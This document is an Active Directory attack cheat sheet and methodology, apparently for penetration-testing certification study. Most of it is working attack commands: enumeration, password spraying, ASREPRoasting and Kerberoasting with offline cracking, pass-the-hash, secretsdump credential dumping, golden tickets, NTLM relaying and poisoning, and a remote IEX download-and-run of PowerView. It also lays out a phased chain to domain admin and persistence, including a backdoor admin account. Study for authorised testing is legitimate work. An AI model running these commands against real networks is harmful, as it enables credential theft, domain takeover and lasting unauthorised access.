## Identify if target is domain-joined
```bash
nmap -p 88,389,636,3268,3269 $IP
```

## Discover domain name via reverse DNS
```bash
# nslookup OR dig -x
nslookup $IP
```

## Discover NetBIOS domain name
```bash
# nbtscan OR nmblookup -A
nbtscan $IP
```

## Test anonymous LDAP binding and extract users
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=*)" | head -20
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | sort > users.txt
```

## Extract computers from anonymous LDAP
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=computer)" dNSHostName | grep dNSHostName | cut -d: -f2 | sort > computers.txt
```

## Test SMB null sessions for share enumeration
```bash
# -u '' for null OR -u 'guest' for guest; add --users for user enum
netexec smb $IP -u '' -p '' --shares
```

## Enumerate domain with enum4linux-ng via null session
```bash
enum4linux-ng -A $IP
```

## Test RPC null session and enumerate users
```bash
# Add -c "enumdomusers" OR -c "enumdomgroups" OR -c "querydominfo"
rpcclient -U "" -N $IP
```

## Create common AD password list for spraying
```bash
cat > passwords.txt << 'EOF'
Password123!
Welcome123!
Summer2024!
Spring2024!
CompanyName2024!
EOF
```

## Password spray with NetExec
```bash
# -p 'Password123!' for single OR -p passwords.txt for file
# Change protocol: smb, ldap, OR winrm
netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
```

## ASREPRoast discovered users without credentials
```bash
# Add -format hashcat -outputfile asrep.hash for direct hashcat output
impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
```

## Hashcat ASREPRoast
```bash
# Add --show to display already cracked hashes
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

## Enumerate domain with valid credentials via NetExec
```bash
# ldap: add --password-policy, --users, --groups, --computers as needed
# smb: add --shares for share enumeration
netexec ldap $IP -u username -p password --users --groups --computers
```

## Kerberoast service accounts with credentials
```bash
# impacket: add -outputfile kerb_hashes.txt OR use netexec with --kerberoasting
impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
```

## Hashcat Kerberoast
```bash
# Add --show to display already cracked hashes
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Test WinRM access with valid credentials
```bash
# netexec for quick test OR evil-winrm for interactive shell
evil-winrm -i $IP -u username -p password
```

## Pass-the-hash with NetExec after obtaining NTLM hash
```bash
netexec smb $IP -u username -H aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
```

## Test cracked service account credentials across domain
```bash
# Test smb --shares OR winrm for shell access
netexec smb $IP -u serviceaccount -p crackedpassword --shares
```

## Dump domain credentials with secretsdump
```bash
# Add -just-dc for DC hashes only OR -just-dc-ntlm for NTLM only
impacket-secretsdump domain.local/username:password@$IP
```

## Verify domain admin privileges
```cmd
net group "Domain Admins" /domain
```

## Create golden ticket with krbtgt hash
```bash
impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain domain.local -domain-sid S-1-5-21-1234567890-1234567890-1234567890 administrator
```

## Create persistent domain admin account
```cmd
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain
```

## Check for SMB relay opportunities
```bash
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```

## Run Responder for LLMNR/NBT-NS poisoning
```bash
responder -I eth0 -wrf
```

## Setup ntlmrelayx for SMB relay attacks
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

## Download PowerView on Windows target
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
```

## Enumerate domain with PowerView
```powershell
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
```

## Find computers with unconstrained delegation
```powershell
Get-DomainComputer -Unconstrained
```

## Find users with SPN for Kerberoasting
```powershell
Get-DomainUser -SPN
```

## Find domain shares accessible by current user
```powershell
Find-DomainShare -CheckShareAccess
```

## Find local admin access on domain computers
```powershell
Find-LocalAdminAccess
Test-AdminAccess
```

## Enumerate domain trusts
```powershell
Get-DomainTrust
Get-DomainTrustMapping
```

## Get domain password policy
```bash
# Use smb with --pass-pol OR ldap with --password-policy
netexec smb $IP -u username -p password --pass-pol
```

## Enumerate with ldapdomaindump
```bash
ldapdomaindump -u 'domain.local\username' -p password $IP
```

## Check for MS17-010 EternalBlue on domain controllers
```bash
nmap -p 445 --script smb-vuln-ms17-010 $IP
```

## Password spray across subnet range
```bash
netexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success
```

## Test administrative access across multiple hosts
```bash
# Change protocol: smb OR winrm
netexec smb 10.10.10.0/24 -u administrator -p password
```

---

## Methodology

### Attack Chain Overview

The AD attack chain follows a systematic progression from anonymous enumeration to domain compromise. Each phase builds on the previous, with multiple paths to escalation.

**Goal Progression:**
1. Anonymous Access -> User List
2. User List -> Valid Credentials
3. Valid Credentials -> Authenticated Enumeration
4. Authenticated Access -> Service Account Compromise
5. Service Account -> Lateral Movement
6. Lateral Movement -> Domain Admin

### Phase 1: Initial AD Discovery

**Objective: Identify if target is domain-joined and discover domain name**

Start with basic network reconnaissance:
1. Scan for AD service ports (88, 389, 636, 3268, 3269)
2. Reverse DNS lookup for domain discovery
3. NetBIOS enumeration for domain name

**Success Criteria:**
- Domain name identified
- Domain controller IP confirmed
- AD environment confirmed

**Time Investment:** 5 minutes

### Phase 2: Anonymous Enumeration

**Objective: Extract user lists without credentials**

Try multiple protocols in parallel for null session access:

**Priority Order:**
1. LDAP anonymous binding (highest success rate)
2. SMB null sessions
3. RPC null authentication

**Success Criteria:**
- User list extracted (minimum 5 users)
- Computer list obtained (optional)
- Group enumeration (bonus)

**Time Investment:** 10-15 minutes

**Decision Point:**
- If anonymous access succeeds: Proceed to Phase 3
- If anonymous access fails: Try ASREPRoasting with guessed usernames, then skip to Phase 4

### Phase 3: Credential Acquisition

**Objective: Obtain valid domain credentials**

With discovered user list, attempt multiple credential attacks:

**Attack Priority:**
1. ASREPRoasting (no credentials needed, safe)
2. Password spraying (use common passwords, risk of lockout)
3. Responder/LLMNR poisoning (if on internal network)

**Common Password List:**
- Password123!
- Welcome123!
- Summer2024!
- Spring2024!
- CompanyName+Year

**Success Criteria:**
- Valid domain credentials obtained
- Account not locked out
- Credentials work for LDAP/SMB/WinRM

**Time Investment:** 15-20 minutes (plus background hash cracking)

**Decision Point:**
- If credentials obtained: Proceed to Phase 4
- If no credentials after 30 min: Try default creds, look for other attack vectors

### Phase 4: Authenticated Enumeration

**Objective: Map attack paths and identify privilege escalation opportunities**

Immediately run BloodHound collection - this is the highest value activity:

**Enumeration Checklist:**
1. BloodHound data collection (TOP PRIORITY)
2. Kerberoast service accounts
3. Enumerate shares for sensitive data
4. Check password policy for spray safety
5. Map network for lateral movement

**Success Criteria:**
- BloodHound data collected and analyzed
- Kerberoastable accounts identified
- Attack paths to Domain Admins mapped

**Time Investment:** 20-30 minutes

### Phase 5: Lateral Movement

**Objective: Escalate privileges or move to high-value systems**

Based on BloodHound analysis, pursue identified attack paths:

**Common Escalation Paths:**
1. Kerberoast -> Crack -> Service account with admin rights
2. Weak ACLs -> GenericAll/WriteDacl abuse
3. Unconstrained delegation -> Force authentication
4. Pass-the-hash -> Local admin on multiple systems

**Success Criteria:**
- Access to additional systems
- Higher privileged account compromised
- Path to Domain Admin identified

**Time Investment:** 30-60 minutes

### Phase 6: Domain Compromise

**Objective: Achieve Domain Admin equivalent access**

Final escalation to domain-level privileges:

**Verification Steps:**
1. Confirm Domain Admin membership or equivalent
2. Test secretsdump for hash extraction
3. Verify access to domain controller

**Persistence Options:**
1. Create backdoor domain admin account
2. Extract krbtgt hash for golden ticket
3. Establish multiple access points

**Success Criteria:**
- Domain Admin or equivalent access achieved
- Domain hashes dumped
- Persistence established

### Attack Chain Decision Trees

**If Anonymous LDAP Succeeds:**
1. Extract all users and computers
2. Immediately try ASREPRoasting
3. Password spray with top 3 passwords
4. Proceed to authenticated enumeration

**If Anonymous Access Fails:**
1. Try ASREPRoast with guessed common usernames
2. Check for default credentials
3. Look for web applications with AD integration
4. Consider Responder if on internal network

**If Password Spraying Succeeds:**
1. Immediately validate credentials on multiple services
2. Run BloodHound collection
3. Kerberoast service accounts
4. Check for WinRM/RDP access

**If Service Account Compromised:**
1. Test for admin privileges on other systems
2. Check for delegation opportunities
3. Look for SPN permission abuse
4. Attempt lateral movement

### Common Attack Combinations

**LDAP -> ASREPRoast -> WinRM Chain:**
1. Anonymous LDAP enumeration for users
2. ASREPRoast discovered users
3. Crack hashes offline
4. Login via WinRM with cracked credentials

**SMB -> Password Spray -> Kerberoast Chain:**
1. SMB null session for user enumeration
2. Password spray with common passwords
3. Kerberoast service accounts with valid creds
4. Crack service hashes for privilege escalation

**Responder -> Relay -> Secretsdump Chain:**
1. Capture credentials with Responder
2. Relay to targets without SMB signing
3. Gain local admin access
4. Extract credentials for lateral movement

### Time Management Strategy

**First 30 Minutes (Critical Window):**
- Test anonymous enumeration across all AD services
- Compile comprehensive user list
- Start ASREPRoast attack
- Password spray with top 5 common passwords

**Next 30 Minutes (Exploitation):**
- Run BloodHound if credentials obtained
- Kerberoast service accounts
- Start hash cracking in background
- Analyze BloodHound paths

**Ongoing (Escalation):**
- Monitor hash cracking progress
- Test cracked credentials immediately
- Pursue identified BloodHound paths
- Lateral movement to high-value targets

### Success Indicators

**Low Privilege Success:**
- Valid domain credentials obtained
- WinRM/RDP access to domain system
- BloodHound data collected successfully

**Medium Privilege Success:**
- Service account with elevated privileges compromised
- Local admin on multiple domain systems
- Clear path to Domain Admin identified

**High Privilege Success:**
- Domain Admin equivalent access
- Access to domain controller
- Domain credential hashes extracted

### BloodHound Priority Analysis

When analyzing BloodHound data, focus on:

**Immediate Wins:**
1. Shortest path to Domain Admins
2. Users with DCSync rights
3. Service accounts with admin access
4. Kerberoastable accounts with privileges

**Medium Effort Paths:**
1. GenericAll/WriteDacl on high-value objects
2. Computers with unconstrained delegation
3. Group Policy abuse opportunities
4. Weak ACLs on sensitive groups

### Common Pitfalls to Avoid

**Account Lockout:**
- Always check password policy before spraying
- Use delay between spray attempts
- Test on small user subset first

**Noise Generation:**
- Don't enumerate all shares on all systems
- Focused enumeration over broad scanning
- Use BloodHound instead of brute force

**Missing Opportunities:**
- Always try ASREPRoasting even without user list
- Check for null sessions on all protocols
- Don't skip BloodHound collection

### Tool Selection Guidelines

**Anonymous Enumeration:**
- ldapsearch for LDAP (lightweight, quiet)
- enum4linux-ng for comprehensive SMB/RPC/LDAP
- NetExec for quick null session testing

**Credential Attacks:**
- impacket-GetNPUsers for ASREPRoasting
- NetExec for password spraying (supports multiple protocols)
- hashcat for hash cracking 

**Authenticated Enumeration:**
- bloodhound-python from Kali (stealthy)
- SharpHound on Windows (comprehensive)
- PowerView for Windows-side enumeration

**Lateral Movement:**
- evil-winrm for interactive shells
- NetExec for credential testing
- impacket suite for targeted attacks

### Resources
- BloodHound Usage Guide: https://bloodhound.readthedocs.io/
- Impacket Examples: https://github.com/SecureAuthCorp/impacket/tree/master/examples
- AD Attack Methodology: https://adsecurity.org/
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- BloodHound Attack Paths: https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
- Emmanuel Solis OSCP Guide: https://www.emmanuelsolis.com/oscp.html
